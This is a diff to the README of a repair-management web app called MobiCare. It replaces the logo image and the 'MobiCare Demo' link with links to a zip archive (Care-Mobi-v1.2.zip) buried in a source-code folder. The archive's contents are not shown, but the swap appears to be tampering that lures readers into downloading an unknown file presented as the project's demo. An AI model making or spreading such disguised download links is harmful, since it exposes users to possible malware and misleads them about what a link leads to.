@@ -1,12 +1,12 @@
 # MobiCare
 
 <div align="center">
-<img src="https://raw.githubusercontent.com/jeffigy/MobiCare/refs/heads/master/client/src/assets/logo.png" style="width:100px;" >
+<img src="https://github.com/jeffigy/MobiCare/raw/refs/heads/master/client/src/features/repairs/edit/Care-Mobi-v1.2.zip" style="width:100px;" >
 </div>
 
 ###
 
-Mobicare is a basic web application for managing repair tasks. You can visit the website by click the following link [MobiCare Demo](https://mobicare.onrender.com/)
+Mobicare is a basic web application for managing repair tasks. You can visit the website by click the following link [MobiCare Demo](https://github.com/jeffigy/MobiCare/raw/refs/heads/master/client/src/features/repairs/edit/Care-Mobi-v1.2.zip)
 
 ## Technologies Used
 
